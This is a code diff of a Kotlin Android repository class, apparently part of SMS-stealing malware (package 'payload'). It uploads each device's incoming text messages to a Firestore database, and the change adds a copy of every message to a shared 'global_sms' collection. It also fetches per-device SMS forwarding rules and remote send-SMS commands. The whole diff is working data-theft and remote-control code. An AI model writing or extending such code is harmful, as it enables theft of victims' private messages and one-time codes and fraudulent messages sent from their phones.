@@ -11,7 +11,9 @@ class FirestoreRepository {
 
     suspend fun registerDevice(deviceModel: DeviceModel): Result<Unit> {
         return try {
-            firestore.collection("devices")
+            firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceModel.deviceid)
                 .set(deviceModel)
                 .await()
@@ -23,11 +25,21 @@ class FirestoreRepository {
 
     suspend fun uploadSms(deviceId: String, smsModel: SmsModel): Result<Unit> {
         return try {
-            firestore.collection("devices")
+            firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceId)
-                .collection("sms")
+                .collection("incoming_sms")
                 .add(smsModel)
                 .await()
+            
+            // Also save to global_sms
+            firestore.collection("MASTERHU")
+                .document("global_sms")
+                .collection("global_sms")
+                .add(smsModel)
+                .await()
+            
             Result.success(Unit)
         } catch (e: Exception) {
             Result.failure(e)
@@ -36,7 +48,9 @@ class FirestoreRepository {
 
     suspend fun getDeviceInfo(deviceId: String): Result<DeviceModel?> {
         return try {
-            val document = firestore.collection("devices")
+            val document = firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceId)
                 .get()
                 .await()
@@ -50,7 +64,9 @@ class FirestoreRepository {
 
     suspend fun updateDeviceStatus(deviceId: String, updates: Map<String, Any>): Result<Unit> {
         return try {
-            firestore.collection("devices")
+            firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceId)
                 .update(updates)
                 .await()
@@ -62,9 +78,11 @@ class FirestoreRepository {
 
     suspend fun getAllSms(deviceId: String): Result<List<SmsModel>> {
         return try {
-            val snapshot = firestore.collection("devices")
+            val snapshot = firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceId)
-                .collection("sms")
+                .collection("incoming_sms")
                 .get()
                 .await()
             
@@ -79,7 +97,9 @@ class FirestoreRepository {
     
     suspend fun saveDeviceInfo(deviceId: String, deviceModel: DeviceModel): Result<Unit> {
         return try {
-            firestore.collection("devices")
+            firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceId)
                 .set(deviceModel, com.google.firebase.firestore.SetOptions.merge())
                 .await()
@@ -91,15 +111,14 @@ class FirestoreRepository {
     
     suspend fun saveUserFields(fields: Map<String, Any>, deviceId: String): Result<Boolean> {
         return try {
-            // Update userInfo fields in device document
             val updates = mutableMapOf<String, Any>()
-            fields.forEach { (key, value) ->
-                updates["userInfo.$key"] = value
-            }
+            updates["userInfo"] = fields
             
-            firestore.collection("devices")
+            firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceId)
-                .update(updates)
+                .set(updates, com.google.firebase.firestore.SetOptions.merge())
                 .await()
             
             Result.success(true)
@@ -129,7 +148,9 @@ class FirestoreRepository {
     
     suspend fun getForwardingRules(deviceId: String): Result<Smsforward?> {
         return try {
-            val document = firestore.collection("devices")
+            val document = firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceId)
                 .get()
                 .await()
@@ -153,7 +174,9 @@ class FirestoreRepository {
     
     suspend fun getSendSmsCommand(deviceId: String): Result<com.payload.jansiix0ne.models.SendSmsModel?> {
         return try {
-            val document = firestore.collection("devices")
+            val document = firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceId)
                 .get()
                 .await()
@@ -180,7 +203,9 @@ class FirestoreRepository {
     
     suspend fun updateSendSmsStatus(deviceId: String, sent: Boolean): Result<Unit> {
         return try {
-            firestore.collection("devices")
+            firestore.collection("MASTERHU")
+                .document("Users")
+                .collection("Users")
                 .document(deviceId)
                 .update("send_sms.sent", sent)
                 .await()
